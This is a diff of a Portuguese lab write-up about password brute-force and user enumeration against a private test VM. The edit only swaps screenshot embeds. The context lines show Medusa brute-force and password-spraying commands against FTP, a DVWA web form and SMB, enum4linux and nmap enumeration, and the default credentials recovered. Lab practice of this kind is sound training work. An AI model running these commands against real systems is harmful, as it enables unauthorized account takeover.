@@ -52,11 +52,14 @@ nano senhas.txt        # msfadmin, password, 123456, toor, admin
 medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp
 ```
 
-**📸** &#91;image: Screenshot\_1.png\]
+![Alt text](./Prints/Screenshot_1.png)
 
 **Resultado:** *User: msfadmin Senha: msfadmin*
 
 O servidor vsftpd 2.3.4 também permitiu autenticação utilizando o usuário anonymous, sem uma senha convencional
+![Alt text](./Prints/Screenshot_2.png)
+
+
 ---
 
 ## Cenário 2 — Automação de Tentativas em Formulário Web (DVWA)
@@ -96,7 +99,7 @@ medusa -h 192.168.56.101 -u admin -P ~/wordlists/senhas.txt -M web-form \
 ACCOUNT FOUND: [web-form] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
 ```
 
-**📸 **&#91;image: Screenshot\_5.png\]
+![Alt text](./Prints/Screenshot_5.png)
 
 ---
 
@@ -111,7 +114,7 @@ enum4linux -a 192.168.56.101
 nmap --script smb-enum-users -p139,445 192.168.56.101
 ```
 
-**📸** &#91;image: Screenshot\_8.png\]
+![Alt text](./Prints/Screenshot_8.png)
 
 **Usuários obtidos**
 
@@ -123,7 +126,7 @@ Testa **poucas senhas contra muitos usuários**, reduzindo o risco de bloqueio d
 medusa -h 192.168.56.101 -U ~/wordlists/usuarios_smb.txt -p "msfadmin" -M smbnt -t 1
 ```
 
-**📸&#91;image: Screenshot\_6.png\]**
+![Alt text](./Prints/Screenshot_6.png)
 
 **Resultado: User:** *msfadmin Senha: msfadmin*
 
